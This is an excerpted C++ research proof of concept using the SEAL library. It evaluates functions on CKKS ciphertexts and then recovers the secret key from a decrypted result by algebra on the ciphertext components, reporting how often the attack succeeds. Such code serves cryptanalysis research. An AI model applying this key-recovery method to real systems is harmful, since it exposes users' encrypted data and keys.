...
void evalVariance(Ciphertext &ctRes, Ciphertext const &ct, CKKSEncoder &encoder,
                  ...
                  GaloisKeys const &gal_keys, uint32_t logBatchSize,
                  double scale) {
...
// logDeg
void evalPowerOf2(std::vector<Ciphertext> &ctRes, Ciphertext const &ct,
                  int logDeg, Evaluator &evaluator,
                  RelinKeys const &relin_keys) {
...
void evalFunction(Ciphertext &ctRes, Ciphertext const &ct,
                  std::vector<double> coeff,
                  std::shared_ptr<SEALContext> context, CKKSEncoder &encoder,
                  Evaluator &evaluator, RelinKeys const &relin_keys,
                  double scale, int evalDeg = -1) {
  int deg = evalDeg == -1
                ? coeff.size() - 1
  ...
  encoder.encode(coeff[0], ctRes.parms_id(), ctRes.scale(),
                 plain_coeff[0]);                     // scale as ctRes
  ...
  for (int i = 2; i <= deg; i++) {
    ...
    while (r > 0) {
      ...
      evaluator.mod_switch_to_inplace(
          ctPow2k, tmp.parms_id()); // ctPow2s[k] is in a higher level
      evaluator.multiply_inplace(tmp, ctPow2k);
      evaluator.relinearize_inplace(tmp, relin_keys);
      evaluator.rescale_to_next_inplace(tmp);
    }

    encoder.encode(coeff[i], tmp.parms_id(), tmp.scale(),
                   plain_coeff[i]);                        // scale as ctRes
    ...
    tmp.scale() =
        new_scale; // round the scaling factor to the nearest power of 2
    ctRes.scale() =
        new_scale; // round the scaling factor to the nextest power of 2
...
int attack(uint32_t logN = 15,      // Ring size
  ...
  int totalQBits = 60;
  while (totalQBits <=
         maxQBits - 60) { // reserve the last special prime (60-bit)
    modulusBits.push_back(
        scaleBits); // add a prime modulus of size == scaleBits
    totalQBits += scaleBits;
  }
  modulusBits.push_back(60); // add the special prime modulus
  parms.set_coeff_modulus(
      CoeffModulus::Create(poly_modulus_degree, modulusBits));
  ...
  switch (hc) {
  case HC_VARIANCE:
    evalVariance(ctxt_res, ctxt_input, encoder, evaluator, relin_keys, gal_keys,
                 log2(slot_count), scale);
    break;
  case HC_SIGMOID:
    coeff = SpecialFunction::coeffsOf[SpecialFunction::FuncName::SIGMOID];
    evalFunction(ctxt_res, ctxt_input, coeff, context, encoder, evaluator,
                 relin_keys, scale, evalDeg);
    break;
  case HC_EXP:
  ...
  sub_dcrtpoly(ptxt_enc.data(), ptxt_res.data(), coeff_count, coeff_modulus,
               ptxt_diff.data());

  to_coeff_rep(ptxt_diff.data(), coeff_count, coeff_mod_count,
               small_ntt_tables);
  ...
  auto rhs(
      util::allocate_zero_poly(poly_modulus_degree, coeff_mod_count, pool));
  sub_dcrtpoly(ptxt_enc.data(), ctxt_res.data(0), coeff_count, coeff_modulus,
               rhs.get());

  auto ca(util::allocate_zero_poly(poly_modulus_degree, coeff_mod_count, pool));
  assign_dcrtpoly(ctxt_res.data(1), coeff_count, coeff_modulus.size(),
                  ca.get());
  ...
  bool has_inv =
      inv_dcrtpoly(ca.get(), coeff_count, coeff_modulus, ca_inv.get());
  if (!has_inv) {
  ...
  auto key_guess(
      util::allocate_zero_poly(poly_modulus_degree, coeff_mod_count, pool));
  mul_dcrtpoly(rhs.get(), ca_inv.get(), coeff_count, coeff_modulus,
               key_guess.get());

  bool is_found = util::is_equal_uint(key_guess.get(), secret_key.data().data(),
  ...
  std::cout << "m' norm bits = "
            << log2(l2_norm(ptxt_enc.data(), context_data.get())) << std::endl;
...
int main(int argc, char *argv[]) {
  ...
  double plainBound =
      argc > 5 ? atof(argv[5]) : 1.0; // upper bound on plaintext numbers
  int32_t evalDeg =
      argc > 6 ? atoi(argv[6]) : -1; // degree to evaluate, default to all
  ...
  std::cout << "Attack worked " << success << " times out of " << iter
            << std::endl;
  return 0;
}
